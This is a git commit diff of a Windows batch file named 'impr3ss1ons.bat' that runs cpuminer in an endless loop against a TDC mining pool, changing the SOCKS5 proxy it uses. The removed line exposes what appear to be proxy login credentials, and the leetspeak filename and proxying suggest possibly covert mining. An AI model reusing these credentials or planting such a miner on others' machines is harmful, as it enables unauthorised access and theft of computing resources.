3230c956742eea21f132c33774de440d54fbfbdf
hensokurtioru <94693457+hensokurtioru@users.noreply.github.com>
2021-11-19 20:35:27 +0700

    Update impr3ss1ons.bat

--- impr3ss1ons.bat
+++ impr3ss1ons.bat
@@ -6,5 +6,5 @@ rem       stratum-asia.rplant.xyz /Singapore/
 rem       stratum-na.rplant.xyz   /Toronto/
 rem
 :start
-cpuminer-sse2.exe -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.Windows -p c=TDC --proxy socks5://ZDQR7M20ho6:ksJNWrpa2M@gru-c10.ipvanish.com:1080
+cpuminer-sse2.exe -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.Windows -p c=TDC --proxy socks5://67.201.33.9:25280
 goto start
